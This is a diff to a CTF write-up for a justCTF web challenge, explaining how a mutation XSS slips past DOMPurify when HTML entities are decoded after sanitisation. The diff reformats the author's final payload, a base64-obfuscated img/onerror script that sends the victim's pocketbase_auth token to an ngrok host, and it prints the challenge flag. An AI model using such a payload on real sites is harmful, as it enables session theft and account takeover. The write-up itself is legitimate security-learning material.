@@ -107,7 +107,9 @@ Its in `routes/view-plant/+page.svelte` route, this routing scheme is specific t
 
 The DOMPurify library was on a stable version and finding a 0-day in this labeled `easy` challenge was surely out-of-scope (although its comming in later challenges :haha:), but this way of sanitizing the title, creating an element with that content, then taking the innerText of the latter, then finally adding it to the title element that gonna be displayed to the user was all just over-engineered and opened the door for a mutation XSS (shortened as mXSS), where I will provide HTML entities in the title `&lt;` (`<`), `&gt;` (`>`) which are normally secure, so DOMpurify will not clear them off, but with the first div element, those html entities will be decoded, so when taking in them back and piping them to the legit title, they will be litterally treated as `<`, `>`, and we can create a html tags with them, so now its only a matter of crafting a payload wich is fairly easy, here is my final working payload:
 
-`&lt;img src=1 onerror=location=atob\`amF2YXNjcmlwdDpmZXRjaCgnaHR0cDovLzIudGNwLmV1Lm5ncm9rLmlvOjEwMDMwLycrYnRvYShsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgicG9ja2V0YmFzZV9hdXRoIikpLCB7IG1vZGU6ICduby1jb3JzJ30p\`&gt;`
+```
+&lt;img src=1 onerror=location=atob`amF2YXNjcmlwdDpmZXRjaCgnaHR0cDovLzIudGNwLmV1Lm5ncm9rLmlvOjEwMDMwLycrYnRvYShsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgicG9ja2V0YmFzZV9hdXRoIikpLCB7IG1vZGU6ICduby1jb3JzJ30p`&gt;
+```
 
 the base64 is just:
 
@@ -124,7 +126,5 @@ Surely after reporting my image, I get back the admin token in my flask server:
 By changing your token to the flag token, you get can view his uploaded image, and by applying exiftool to it, you find flag:
 
 ![image](https://github.com/mwlik/mwlik.github.io/assets/73129654/b037e1b7-2700-46e8-8809-845a23ef740f)
-
-![image](https://github.com/mwlik/mwlik.github.io/assets/73129654/76b8be06-72c6-49fc-b17a-f287c3324a17)
 
 And Here you go!: `justCTF{97603333-6596-43fe-aef8-a134c1cc11b4}`
